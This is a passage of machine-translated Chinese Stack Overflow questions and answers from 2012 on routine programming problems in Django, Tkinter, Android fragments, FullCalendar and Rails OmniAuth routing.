at org.jivesoftware.openfire.net.VirtualConnection.notifyCloseListeners(VirtualConnection.java:214)
at org.jivesoftware.openfire.net.VirtualConnection.close(VirtualConnection.java:190)
at org.jivesoftware.openfire.http.HttpSession$HttpVirtualConnection.systemShutdown(HttpSession.java:1008)
at org.jivesoftware.openfire.spi.LocalRoutingTable.stop(LocalRoutingTable.java:146)
at org.jivesoftware.openfire.spi.RoutingTableImpl.stop(RoutingTableImpl.java:857)
at org.jivesoftware.openfire.XMPPServer.shutdownServer(XMPPServer.java:948)
at org.jivesoftware.openfire.XMPPServer.access$700(XMPPServer.java:146)
at org.jivesoftware.openfire.XMPPServer$ShutdownHookThread.run(XMPPServer.java:898) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T07:15:59.440

这可能是您正在（或未）传递给数据库驱动程序的参数的问题 - 或者可能是数据库驱动程序本身的错误。我的猜测是您没有在数据库连接字符串中传递必需的属性。

这当然不是 openfire 本身的问题——我们已经使用 openfire 很多年了，它是一款出色的软件。

# java - 如何进行拓扑排序；创建入度

> ID：13537296
> 
> 赞同：0
> 
> 时间：2012-11-24T00:45:27.960
> 
> 标签：java, graph, topological-sort

我正在为学校作业构建一个图形结构。它目前表示为邻接列表：我正在使用哈希图，其中键是图的节点（顶点），值是边列表（包含源节点和目标节点指针以及“权重”的对象) 与关键节点关联。

我的下一个任务是编写拓扑排序，但我被困住了。我认为最好的开始方法是给我的每个节点对象一个整数字段来表示入度（导致节点的边的数量），但我想不出一种方法来将它分配给我的所有节点鉴于我已经拥有的。

有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T01:07:55.027

我建议您也创建 Node.js 的概念。这意味着除了您是 Edge 对象之外，您还将拥有 Node 对象，更好的建模总是可以帮助您更快地解决问题。在这种情况下，使用 Node 定义的 HashMap 有一个键 Integer 会有所帮助，因为您可以在 Node 实例中存储其他信息。

但是，如果您想/需要保留当前结构，为了知道有多少条边通向给定节点，您必须遍历 HashMap entrySet 的各种值（根据您所说的将是边缘）并查看哪些边缘具有您要查找的节点具有目标节点，但此信息必须存储在辅助结构中（例如有另一个地图）

# python - Django：如何使用表单数据设置 ForeignKey

> ID：13537300
> 
> 赞同：0
> 
> 时间：2012-11-24T00:45:59.317
> 
> 标签：python, django

我似乎错过了什么。我试图让用户为他们的写作选择一种流派，然后将其设置为来自工作（写作）表/模型的流派表/模型的外键。

错误：`Django AttributeError: 'str' object has no attribute '_default_manager'` 这就是我现在的做法。

表格.py

```
class post_ow(forms.Form):
    def __init__(self, *args, **kwargs):
        super(post_ow, self).__init__(*args, **kwargs)
        self.fields['one_shot'].label = "Single Chapter or Multiple Chapters"
        c = []
        genre = Genre.objects.filter(poem = False).order_by('name')
        for b in genre:
            c.append((b.id,b.name))
        self.fields['genre'] = forms.ChoiceField(choices = c)

    title = forms.CharField(error_messages = {'required' : 'Title Required'}, widget= forms.TextInput(attrs={'style':'width=600px'}))
    summery = forms.CharField(widget = forms.Textarea(), error_messages= {'required' : 'Summery Required'})
    genre = forms.ChoiceField(choices = ())
    one_shot = forms.ChoiceField(choices = (
        ('one', 'Single Chapter'),
        ('multi', 'Multiple Chapters'),
        )) 
```

模型.py

```
class Genre(models.Model):
    name = models.CharField(max_length=20)
    poem = models.BooleanField()
    ordernumber = models.IntegerField()
    def __unicode__(self):
        return self.name

class Work(models.Model):
    title = models.CharField(max_length=30)
    summery = models.TextField()
    user = models.ForeignKey(User)
    date_published = models.DateField()
    date_updated = models.DateField()
    one_shot = models.BooleanField()
    completed = models.BooleanField()
    genre = models.ForeignKey(Genre)
    TYPES = (
        ('FF', 'Fan Fiction'),
        ('OF', 'Original Work'),
        ('PW', 'Poetry Work'),
        )
    types = models.CharField(max_length=2, choices=TYPES)
    fandom = models.ForeignKey(Book, blank = True, null= True)
    def __unicode__(self):
        return self.title + '-' + self.user.email 
```

在 view.py 中导致错误的行：

```
g = get_object_or_404('Genre', id = form.cleaned_data['genre'])
pw = Work(title = form.cleaned_data['title'], summery = form.cleaned_data['summery'], user = request.user, one_shot = True, types = 'pw',
        date_published = current_date, date_updated = current_date, completed = True, genre = g) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T04:34:40.483

[如django 文档所述](https://docs.djangoproject.com/en/dev/ref/forms/fields/#modelchoicefield)，更改表单“流派”字段：

```
genre = forms.ModelChoiceField(queryset=Genre.objects.filter(poem = False).order_by('name')) 
```

并删除该**初始化**方法。使用这一行，您可以替换该字段的初始值并将该标签放入“one_shot”字段，您可以将其作为字段参数传递：

```
one_shot = forms.ChoiceField(
    choices = (
        ('one', 'Single Chapter'),
        ('multi', 'Multiple Chapters'),
    ),
    label = "Single Chapter or Multiple Chapters"
) 
```

# python - Python - 深度优先迷宫求解器

> ID：13537301
> 
> 赞同：2
> 
> 时间：2012-11-24T00:46:08.927
> 
> 标签：python, maze

我在 python 中有一个作业，我应该让一个“机器人”从头到尾，并返回目标的路径。我有机器人搜索，但我希望列表只显示从开始到结束的路径。现在 pathList 返回所有访问过的方格......而且，当涉及到目标时，它不会停止，只是继续其他节点。我错过了什么？

```
def find(labyrinth, robotPos, pathList = []):

    frontier = adjacent_passages(labyrinth, robotPos)   
    pathList.append(robotPos)

    if len(frontier) == 1:
        print("Corner")
        return []

    for i in range(0, len(frontier)):
        if frontier[i] == goal:
            pathList.append(frontier[i])
            return pathList

    for i in range(0, len(frontier)):
        if frontier[i] not in pathList:
            pathList.append(frontier[i])
            if (find(labyrinth, frontier[i], pathList) == []):
                pathList.pop()

    return pathList 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T02:16:29.623

我不知道这是否是您问题的答案，但我注意到的第一件事是您不应该使用列表作为默认函数参数（`pathList = []`）。

请参阅[“Least Astonishment”和可变默认参数](https://stackoverflow.com/questions/1132941/least-astonishment-in-python-the-mutable-default-argument)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-24T02:21:56.037

即使搜索失败，您也不会删除它，这就是列表包含所有访问过`append`的位置的原因。我建议完全避免列表突变（追加/弹出），而是将新值作为参数传递给下一次迭代：`robotPos``pathList`

```
if (find(labyrinth, frontier[i], pathList + [frontier[i]]) == [])... 
```

其他可能的简化是：

*   下降`robotPos`。让当前位置成为`path`参数的最后一项
*   使用一个循环而不是两个
*   在循环中，使用`for x in stuff`而不是`for i in range(0, len(stuff))`

就像是

```
def find(path):

    if path[-1] == goal:
        return path

    for new_position in adjacent_positions(path[-1]):
        if new_position not in path:
            found_path = find(path + [new_position])
            if found_path:
                return found_path

    return None 
```

# python - python 2.7 Tk更改标签以从打开的文件中携带文件名

> ID：13537302
> 
> 赞同：2
> 
> 时间：2012-11-24T00:46:15.340
> 
> 标签：python, tkinter

我在 python 2.7 中有这个代码，它使用它在 a 上`tkinter`创建`Button`一个`Frame`来打开文件。下面有一个`Label`。我正在尝试这样做，因此一旦打开文件，标签就会在 上打印路径“file1.name”或其他任何内容，`Label`如果您打开一个新文件，它将`Label`再次更改。

此外，我敢打赌，在函数之间移动数据的方法比我在这里使用的更好`global`，但我现在并不担心。

我必须在函数之间移动打开的文件中的数据，以便可以混合数据并保存到新文件中。代码是：

```
from Tkinter import *
import Tkinter
import tkFileDialog
import tkMessageBox
root = Tkinter.Tk()
global rfile1
global rfile2
rfile1 = ""
rfile2 = ""
class Application(Frame):

    def __init__(self, master = None):
        Frame.__init__(self, master)
        self.grid()
        self.createWidgets1()
        self.createLabels1()
        self.createWidgets2()
        self.createLabels2()

    def createWidgets1(self):
        self.oButton = Button(self, text = "open1", command = self.openfile1)
        self.oButton.grid()

    def createLabels1(self):
        self.oLabel = Label(self, text = "whoops")
        self.oLabel.grid()

    def createWidgets2(self):
        self.oButton = Button(self, text = "open2", command= self.openfile2)
        self.oButton.grid()

    def createLabels2(self):
        self.oLabel2 = Label(self, text = "whoops2")
        self.oLabel2.grid()

    def openfile1(self):
        file1 = tkFileDialog.askopenfile(title = "choose a file, *****", parent=root, mode = 'rb')

        rfile1 = file1.read()
        tkMessageBox.showinfo("oy", rfile1, parent=root)

    def openfile2(self):
        file2 = tkFileDialog.askopenfile(parent=root, mode='rb')

        rfile2 = file2.read()
        tkMessageBox.showinfo("hola", rfile2, parent=root)

app = Application()
app.master.title("whiggy whompus")
app.mainloop() 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T01:23:38.577

如果我理解正确，您需要类似（*未经测试*）：

```
def openfile1(self):
    file1 = tkFileDialog.askopenfile(title = "choose a file, *****", parent=root, mode = 'rb')
    self.oLabel.configure(text=file1.name)    
    rfile1 = file1.read()
    tkMessageBox.showinfo("oy", rfile1, parent=root) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-07-07T08:59:43.063

@mgilson 解决了您的第一个问题。您的第二个问题，关于如何在不使用 globals 的情况下在函数之间传递参数：

您可能希望将变量存储为应用程序类的属性：

语法自我。是当前实例的属性（实例是类的特定示例 - 就像您的汽车是类“汽车”的特定示例）。您可以在此示例中使用实例属性，就好像它们是全局属性一样。

```
from Tkinter import *
import Tkinter
import tkFileDialog
import tkMessageBox
root = Tkinter.Tk()

class Application(Frame):

    def __init__(self, master = None):
        Frame.__init__(self, master)
        self.grid()
        self.createWidgets1()
        self.createLabels1()
        self.createWidgets2()
        self.createLabels2()
        self.rfile1 = ""
        self.rfile2 = ""

    def createWidgets1(self):
       self.oButton = Button(self, text = "open1", command = self.openfile1)
       self.oButton.grid()

    def createLabels1(self):
        self.oLabel = Label(self, text = "whoops")
        self.oLabel.grid()

    def createWidgets2(self):
        self.oButton = Button(self, text = "open2", command= self.openfile2)
        self.oButton.grid()

    def createLabels2(self):
        self.oLabel2 = Label(self, text = "whoops2")
        self.oLabel2.grid()

    def openfile1(self):
        file1 = tkFileDialog.askopenfile(title = "choose a file, *****", parent=root, mode = 'rb')

        self.rfile1 = file1.read()
        tkMessageBox.showinfo("oy", self.rfile1, parent=root)

    def openfile2(self):
        file2 = tkFileDialog.askopenfile(parent=root, mode='rb')

        self.rfile2 = file2.read()
        tkMessageBox.showinfo("hola", self.rfile2, parent=root)

app = Application()
app.master.title("whiggy whompus")
app.mainloop() 
```

# android - 消失的碎片（无需请求即可分离）

> ID：13537303
> 
> 赞同：2
> 
> 时间：2012-11-24T00:46:17.307
> 
> 标签：android, android-fragments

我有一个简单的布局，其中包含两个片段。两个片段中的一个会定期更换自己，另一个将在我使用它的整个过程中保持一致。出于某种原因，删除/添加它可以正常工作，但替换它会导致另一个片段消失。我从调试代码中知道片段只是被分离了，没有明显的原因。为什么会这样？如果我使用后者，我必须非常小心以确保 QuestionArea 首先消失......

这些代码行来自 FragmentActivity 类。

```
 fragManager.beginTransaction()
        .replace(R.id.QuestionArea, getQuestionPostView(), "QuestionArea")
        .commit();

        fragManager.beginTransaction()
        .remove(fragManager.findFragmentById(R.id.QuestionArea))
        .add(R.id.QuestionArea, getQuestionPostView(), "QuestionArea")
        .commit(); 
```

这是我希望的其他相关代码：

主显示的 XML：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:layout_gravity="center"
    android:orientation="vertical" >

    <com.pearsonartphoto.FontFitTextView
        android:id="@+id/Name"
        style="@style/bigText"
        android:background="@color/blue"
        android:gravity="center"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content" 
        android:layout_alignParentLeft="true"
        android:layout_alignParentRight="true"
        android:layout_alignParentTop="true"/>

    <TextView android:id="@+id/Instructions"
        style="@style/medText"
        android:layout_width="fill_parent"
        android:layout_below="@id/PowerName"
        />

    <fragment
        android:name="com.pearsonartphoto.NumberDisplay"
        android:gravity="center"
        android:id="@+id/QuestionArea"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_below="@id/Instructions"/>

    <fragment
        android:name="com.pearsonartphoto.AbstractAnswerFragment"
        android:id="@+id/AnswerArea"
        style="@style/bigText"
        android:gravity="center"
        android:layout_below="@+id/QuestionArea"
        android:layout_alignParentBottom="true"
        android:layout_width="fill_parent"
        android:layout_height="530sp"/>

</RelativeLayout> 
```

设置 AnswerArea 的 FragmentActivity 的一部分

```
protected void setAnswerPad(AbstractAnswerFragment pad)
{
    fragManager.beginTransaction()
        .replace(R.id.AnswerArea, pad, "AnswerArea")
        .commit();
    fragManager.executePendingTransactions();

    answerPadToAnswer=pad.getAnswerKey();
} 
```

第一次（来自 FragmentActivity）设置 QuestionArea。

```
 fragManager.beginTransaction()
    .replace(R.id.QuestionArea, getQuestionPreView(), "QuestionArea")
    .commit(); 
```

函数 getPostView() 和 getPreView()

```
@Override
Fragment getQuestionPreView() {
    NumberDisplay display=(NumberDisplay)manager.findFragmentById(R.id.QuestionArea);
    display.setNumber(-1);
    return display;
}

@Override
Fragment getQuestionPostView() {
    NumberDisplay display=(NumberDisplay)manager.findFragmentById(R.id.QuestionArea);
    display.setNumber(answer);
    return display;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T06:16:05.130

您的问题很可能来自尝试在运行时更改静态片段（在 xml 布局中声明的片段），您不应该这样做。如果您打算替换、删除等这些片段，您`FragmentActivity`应该`FrameLayout`在 xml 布局中的位置放置一个包装器布局（如 a ），并将该容器用于未来的片段事务。从一位 Android 工程师那里查看[这个答案。](https://stackoverflow.com/questions/9543770/android-fragment-not-replacing-properly/9543862#9543862)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T12:54:36.993

要完成这项工作，需要做几件事：

1.  关键是将我的主要 XML 代码更改为`FrameLayout`.
2.  当我以前不需要创建它们时，我不得不创建一些较小的片段。

新的主要 XML 代码：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:layout_gravity="center"
    android:orientation="vertical" >

    <com.pearsonartphoto.FontFitTextView
        android:id="@+id/PowerName"
        style="@style/bigText"
        android:background="@color/blue"
        android:gravity="center"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content" 
        android:layout_alignParentLeft="true"
        android:layout_alignParentRight="true"
        android:layout_alignParentTop="true"/>

    <TextView android:id="@+id/Instructions"
        style="@style/medText"
        android:layout_width="fill_parent"
        android:layout_below="@id/PowerName"
        />

    <FrameLayout 
        android:gravity="center"
        android:id="@+id/QuestionArea"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_below="@id/Instructions"/>

    <FrameLayout 
        android:id="@+id/AnswerArea"
        style="@style/bigText"
        android:gravity="center"
        android:layout_below="@+id/QuestionArea"
        android:layout_alignParentBottom="true"
        android:layout_width="fill_parent"
        android:layout_height="530sp"/>

</RelativeLayout> 
```

# python - 线上遇到“上课”

> ID：13537309
> 
> 赞同：0
> 
> 时间：2012-11-24T00:47:06.527
> 
> 标签：python, django

```
class Category(models.Model): 
    title = models.CharField(max_length=100, db_index=True,unique=True) 
    slug = models.SlugField(max_length=100, unique=True) 
def __unicode__(self): 
    return self.title 
def get_absolute_url(self): 
    return (reverse('tags',[str(self.slug)]) 

class Blog(models.Model):
    title = models.CharField(max_length=100, unique=True)
    slug = models.SlugField(max_length=100, unique=True)
    body = models.TextField()
    posted = models.DateField(db_index=True, auto_now_add=True)
    category = models.ManyToManyField(Category)

    def __unicode__(self):
        return self.title

    def get_absolute_url(self):
        return (reverse('posts',[str(self.slug)]) 
```

**这是我的模型，我在课堂上遇到了一个愚蠢的错误：**

> 在第 16 行第 1 列遇到“类”。期待以下之一：
> “（”...“）”...“[”...“”...“。” ...“+”...
> “-”...“*”...“/”...“//”...“<<”...“>>”...“% " ... "^" ... "|" ... "&" ... ">" ...
> "<" ... "==" ... "<=" ... >=" ... "<>" ..." !=" ...“或”...“和”...“不是”...“是”...“在”...“如果”...“对于”...“， “……

这意味着什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T00:48:53.253

听起来你之前没有结束你的一个陈述。查找不正确的括号、引号或错误消息中列出的任何不正确的符号。实际上，使用您的最新代码，我发现：

```
return (reverse('tags',[str(self.slug)]) 
```

你少了一个括号。试试这个：

```
return (reverse('tags',[str(self.slug)])) 
```

# fullcalendar - FullCalendar 事件文本颜色更改

> ID：13537310
> 
> 赞同：4
> 
> 时间：2012-11-24T00:47:27.743
> 
> 标签：fullcalendar

我将 className 添加`fc-selected`到任何选定的日期，以处理该选定单元格的背景颜色更改。考虑到我回家了，只需要更改`color`下一个文本，我强行移除了几绺头发，直到后来我才意识到日期事件不在日期单元格中，而是绝对位于它的上方和外部。如何定位日历中选定日期的事件 DOM？

基本上，日期单元格的背景颜色在选择时变为深红色，我需要将标题文本暂时更改为白色。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-03T12:11:07.803

您可以设置事件的

`textColor: white`或#FFF

[http://arshaw.com/fullcalendar/docs/event_data/Event_Object/](http://arshaw.com/fullcalendar/docs/event_data/Event_Object/)

您还可以设置`eventTextColor`同时重做事件

[http://arshaw.com/fullcalendar/docs/event_rendering/eventTextColor/](http://arshaw.com/fullcalendar/docs/event_rendering/eventTextColor/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-10-12T12:48:33.287

实际上，我尝试了很多次，但 textColor 或 eventTextColor 的任何变体都没有奏效。所以，我尝试手动更改颜色属性；

```
.portlet.calendar .fc-event .fc-time {
    color: white;
}

.portlet.calendar .fc-event .fc-title {
    color: white;
} 
```

通过使用像这样的简单javascript，您还可以设置全日历的字体颜色；

```
var colorStyle = document.getElementsByClassName('fc-title');

for (var i=0; i<colorStyle.length; i++) {
    colorStyle[i].style.color = 'white';
} 
```

# ruby-on-rails - 路由错误未初始化常量用户

> ID：13537313
> 
> 赞同：27
> 
> 时间：2012-11-24T00:47:51.243
> 
> 标签：ruby-on-rails, facebook, devise, ruby-on-rails-3.2, omniauth

我是 Rails 新手...我正在尝试设置使用 facebook 登录以获取演示应用程序。我正在使用 OmniAuth 并遵循本教程

[https://github.com/plataformatec/devise/wiki/OmniAuth:-概述](https://github.com/plataformatec/devise/wiki/OmniAuth:-Overview)

重定向到 fB 时出现此错误：

```
 Routing Error:

    uninitialized constant Users

    Try running rake routes for more information on available routes. 
```

**环境**

```
Windows 7
Rails version :3.2.9.rc2
omniauth-1.1.1
devise-2.1.2 
```

我的 routes.rb 看起来像这样：

```
 root :to => 'static_pages#home'
  resources :users
  get "static_pages/home"
  match '/auth/facebook' => 'omniauth#passthru'
  match '/users/auth/facebook' => 'users/omniauth_callbacks#passthru'
  devise_for :users, :controllers => { :omniauth_callbacks => "users/omniauth_callbacks" } , :strategy_class => OmniAuth::Strategies::Facebook 
```

devise.rb 包含：

```
require 'devise/orm/active_record'
require 'omniauth-facebook'

config.omniauth_path_prefix = "/users/auth"
  config.omniauth :facebook, "ABC", "XYZ",{:client_options => { :ssl => { :verify => false } }} 
```

而OmniAuthController包含：即app/controllers/omniauth_callbacks_controller.rb

```
class Users::OmniauthCallbacksController < Devise::OmniauthCallbacksController

  def facebook
    # You need to implement the method below in your model (e.g. app/models/user.rb)
    @user = User.find_for_facebook_oauth(request.env["omniauth.auth"], current_user)

    if @user.persisted?
      sign_in_and_redirect @user, :event => :authentication #this will throw if @user is not activated
      set_flash_message(:notice, :success, :kind => "Facebook") if is_navigational_format?
    else
      session["devise.facebook_data"] = request.env["omniauth.auth"]
      #redirect_to new_user_registration_url
      redirect_to "static_pages_home"
    end
  end 

  def passthru
    render :file => "#{Rails.root}/public/404.html", :status => 404, :layout => false
    # Or alternatively,
    # raise ActionController::RoutingError.new('Not Found')
  end

end 
```

模型 User.rb 包含：

```
class User < ActiveRecord::Base
  # Include default devise modules. Others available are:
  # :token_authenticatable, :confirmable,
  # :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :trackable, :validatable 

  # Setup accessible (or protected) attributes for your model
  attr_accessible :email, :password, :password_confirmation, :remember_me
  attr_accessible :date_of_birth, :firstName, :lastName, :mailId, :phone, :provider, :uid
  devise :omniauthable

 protected

 def self.find_for_facebook_oauth(auth, signed_in_resource=nil)
    user = User.find(:provider => auth.provider, :uid => auth.uid).first
    unless user
      user = User.create(name:auth.extra.raw_info.name,
                           provider:auth.provider,
                           uid:auth.uid,
                           email:auth.info.email,
                           password:Devise.friendly_token[0,20]
                           )
    end
    user
  end  

 def self.new_with_session(params, session)
    super.tap do |user|
      if data = session["devise.facebook_data"] && session["devise.facebook_data"]["extra"]["raw_info"]
        user.email = data["email"] if user.email.blank?
      end
    end
  end

end 
```

痕迹：

在 2012-11-23 22:39:32 -0800 (facebook) 开始为 127.0.0.1 获取“/users/auth/facebook”（facebook）回调阶段已启动。

开始 GET "/users/auth/facebook/callback?

```
state=XYZ&code=ABC" for 127.0.0.1 at 2012-11-23 22:39:33 -0800

ActionController::RoutingError (uninitialized constant Users):
  activesupport (3.2.9.rc2) lib/active_support/inflector/methods.rb:230:in `block in constantize'
  activesupport (3.2.9.rc2) lib/active_support/inflector/methods.rb:229:in `each'
  activesupport (3.2.9.rc2) lib/active_support/inflector/methods.rb:229:in `constantize'
  actionpack (3.2.9.rc2) lib/action_dispatch/routing/route_set.rb:69:in `controller_reference'
  actionpack (3.2.9.rc2) lib/action_dispatch/routing/route_set.rb:54:in `controller'
  actionpack (3.2.9.rc2) lib/action_dispatch/routing/route_set.rb:32:in `call'
  actionpack (3.2.9.rc2) lib/action_dispatch/routing/mapper.rb:42:in `call'
  journey (1.0.4) lib/journey/router.rb:68:in `block in call'
  journey (1.0.4) lib/journey/router.rb:56:in `each'
  journey (1.0.4) lib/journey/router.rb:56:in `call'
  actionpack (3.2.9.rc2) lib/action_dispatch/routing/route_set.rb:600:in `call'
  omniauth (1.1.1) lib/omniauth/strategy.rb:394:in `call_app!'
  omniauth (1.1.1) lib/omniauth/strategy.rb:356:in `callback_phase'
  omniauth-oauth2 (1.1.1) lib/omniauth/strategies/oauth2.rb:77:in `callback_phase'
  omniauth (1.1.1) lib/omniauth/strategy.rb:219:in `callback_call'
  omniauth (1.1.1) lib/omniauth/strategy.rb:175:in `call!'
  omniauth (1.1.1) lib/omniauth/strategy.rb:157:in `call'
  warden (1.2.1) lib/warden/manager.rb:35:in `block in call'
  warden (1.2.1) lib/warden/manager.rb:34:in `catch'
  warden (1.2.1) lib/warden/manager.rb:34:in `call'
  actionpack (3.2.9.rc2) lib/action_dispatch/middleware/best_standards_support.rb:17:in `call'
  rack (1.4.1) lib/rack/etag.rb:23:in `call'
  rack (1.4.1) lib/rack/conditionalget.rb:25:in `call'
  actionpack (3.2.9.rc2) lib/action_dispatch/middleware/head.rb:14:in `call'
  actionpack (3.2.9.rc2) lib/action_dispatch/middleware/params_parser.rb:21:in `call'
  actionpack (3.2.9.rc2) lib/action_dispatch/middleware/flash.rb:242:in `call'
  rack (1.4.1) lib/rack/session/abstract/id.rb:205:in `context'
  rack (1.4.1) lib/rack/session/abstract/id.rb:200:in `call'
  actionpack (3.2.9.rc2) lib/action_dispatch/middleware/cookies.rb:341:in `call'
  activerecord (3.2.9.rc2) lib/active_record/query_cache.rb:64:in `call'
  activerecord (3.2.9.rc2) lib/active_record/connection_adapters/abstract/connection_pool.rb:479:in `call'
  actionpack (3.2.9.rc2) lib/action_dispatch/middleware/callbacks.rb:28:in `block in call'
  activesupport (3.2.9.rc2) lib/active_support/callbacks.rb:405:in `_run__959081092__call__942932381__callbacks'
  activesupport (3.2.9.rc2) lib/active_support/callbacks.rb:405:in `__run_callback'
  activesupport (3.2.9.rc2) lib/active_support/callbacks.rb:385:in `_run_call_callbacks'
  activesupport (3.2.9.rc2) lib/active_support/callbacks.rb:81:in `run_callbacks'
  actionpack (3.2.9.rc2) lib/action_dispatch/middleware/callbacks.rb:27:in `call'
  actionpack (3.2.9.rc2) lib/action_dispatch/middleware/reloader.rb:65:in `call'
  actionpack (3.2.9.rc2) lib/action_dispatch/middleware/remote_ip.rb:31:in `call'
  actionpack (3.2.9.rc2) lib/action_dispatch/middleware/debug_exceptions.rb:16:in `call'
  actionpack (3.2.9.rc2) lib/action_dispatch/middleware/show_exceptions.rb:56:in `call'
  railties (3.2.9.rc2) lib/rails/rack/logger.rb:32:in `call_app'
  railties (3.2.9.rc2) lib/rails/rack/logger.rb:16:in `block in call'
  activesupport (3.2.9.rc2) lib/active_support/tagged_logging.rb:22:in `tagged'
  railties (3.2.9.rc2) lib/rails/rack/logger.rb:16:in `call'
  actionpack (3.2.9.rc2) lib/action_dispatch/middleware/request_id.rb:22:in `call'
  rack (1.4.1) lib/rack/methodoverride.rb:21:in `call'
  rack (1.4.1) lib/rack/runtime.rb:17:in `call'
  activesupport (3.2.9.rc2) lib/active_support/cache/strategy/local_cache.rb:72:in `call'
  rack (1.4.1) lib/rack/lock.rb:15:in `call'
  actionpack (3.2.9.rc2) lib/action_dispatch/middleware/static.rb:62:in `call'
  railties (3.2.9.rc2) lib/rails/engine.rb:479:in `call'
  railties (3.2.9.rc2) lib/rails/application.rb:223:in `call'
  rack (1.4.1) lib/rack/content_length.rb:14:in `call'
  railties (3.2.9.rc2) lib/rails/rack/log_tailer.rb:17:in `call'
  rack (1.4.1) lib/rack/handler/webrick.rb:59:in `service'
  c:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9.1/webrick/httpserver.rb:138:in `service'
  c:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9.1/webrick/httpserver.rb:94:in `run'
  c:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9.1/webrick/server.rb:191:in `block in start_thread'

  Rendered c:/RailsInstaller/Ruby1.9.3/lib/ruby/gems/1.9.1/gems/actionpack-3.2.9.rc2/lib/action_dispatch/middleware/templates/rescues/
ing_error.erb within rescues/layout (0.0ms) 
```

* * *

## 回答 #1

> 赞同：80
> 
> 时间：2012-11-29T09:16:10.610

MV

> 应用程序/控制器/omniauth_callbacks_controller.rb

到

> 应用程序/控制器/用户/omniauth_callbacks_controller.rb

或改变

```
class Users::OmniauthCallbacksController < Devise::OmniauthCallbacksController 
```

到

```
class OmniauthCallbacksController < Devise::OmniauthCallbacksController 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T09:00:25.027

我相信那部分搞砸了：

```
match '/users/auth/facebook' => 'users/omniauth_callbacks#passthru' 
```

小测试，给你：

在你看来：

```
<%= link_to users_auth_facebook_path, users_auth_facebook_path  %> 
```

并点击它，它也给出了同样的错误......

我相信你应该使用类似的东西（你在上面链接的wiki中提到的）：

```
devise_scope :user do
  get '/users/auth/:provider' => 'users/omniauth_callbacks#passthru'
end 
```

并根据 params[:provider] 值包装 passthru 方法以将操作委托给适当的私有/受保护方法

```
class Users::OmniauthCallbacksController < Devise::OmniauthCallbacksController
  def passthru
    send(params[:provider]) if providers.include?(params[:provider])
  end

  protected

  def facebook
    raise "Implement me for facebook"
  end

  def twitter
    raise "Implement me for twitter"
  end

  private

  def providers
    ["facebook", "twitter"]
  end
end 
```

# android - 在 CalendarContracts.Instances 中，确定原始事件是否重复发生

> ID：13537315
> 
> 赞同：0
> 
> 时间：2012-11-24T00:47:57.770
> 
> 标签：android, calendar, instances, recurring

CalendarContracts.Instances 查询返回，所有重复事件都扩展为单个实例“占位符”。如何判断哪些行代表占位符，哪些是唯一的单个事件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-03T07:12:07.057

> 1.如何分辨哪些行代表占位符，哪些是唯一的、单一的事件？

要检测单个非重复事件，您可以更轻松地查询`CalendarContacts.Events`和查找重复列为空的事件。

> 2.后两者只有出现在RRULE定义的规则中才能定义

False，RDATE 和 RRULE 完全相互独立。请参阅[4.6.1 事件组件](http://pretty-rfc.herokuapp.com/RFC2445)：

> ```
>  ; the following are optional,
>        ; and MAY occur more than once
> 
>        attach / attendee / categories / comment /
>        contact / EXDATE/ EXRULE/ rstatus / related /
>        resources / RDATE / RRULE / x-prop 
> ```
> 
> 3.有人愿意解释吗？

RRULE 指定一个循环模式。
而 RDATE 指定一组重复的日期时间。

有关正式定义和示例，请参见[4.8.5 循环组件属性](http://pretty-rfc.herokuapp.com/RFC2445)。

事实上，它们甚至可以共存：

> 说明：此属性 [RDATE] 可以与“RRULE”属性一起出现，以定义重复出现的聚合集。当它们都出现在 iCalendar 对象中时，重复事件由“RDATE”和“RRULE”定义的事件的联合定义。

所以该函数基本上说，“如果任何列不为空，则返回 true”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T16:23:16.703

我在 android Calendar 源代码中找到了这段代码。我不确定为什么它会检查所有三个属性，因为我相信后两个属性只有在它们出现在 RRULE 定义的规则中时才能定义。有人愿意解释吗？

```
 public static boolean isRecurrenceEvent(ContentValues values) {  
    return (!TextUtils.isEmpty(values.getAsString(Events.RRULE))||  
            !TextUtils.isEmpty(values.getAsString(Events.RDATE))||  
            !TextUtils.isEmpty(values.getAsString(Events.ORIGINAL_EVENT)));  
  } 
```

# java - 在扩展 JPanel 的类中未调用按钮 ActionListener

> ID：13537316
> 
> 赞同：5
> 
> 时间：2012-11-24T00:48:02.237
> 
> 标签：java, macos, swing, user-interface, actionlistener

